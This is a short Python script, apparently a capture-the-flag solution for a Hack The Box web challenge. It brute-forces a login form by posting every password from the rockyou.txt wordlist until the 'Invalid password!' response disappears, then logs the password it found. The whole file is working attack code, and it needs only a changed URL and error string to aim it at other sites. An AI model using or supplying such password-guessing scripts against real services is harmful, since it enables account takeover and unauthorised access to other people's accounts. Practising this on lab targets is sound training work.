#!/usr/bin/python3
import requests

server = "http://docker.hackthebox.eu:50380/"
error_string = "Invalid password!"

logfile = open("logfile.txt","w")

with open("../common-resources/rockyou.txt","r") as f:
    for line in f:
        passwd = line.rstrip()
        payload = {'password': passwd}
        r = requests.post(server, data=payload)

        logfile.write(str(r.status_code))

        if(error_string not in r.text):
            logfile.write(r.text)
            logfile.write("------ Password found -------: " + passwd)
            break;

logfile.close()
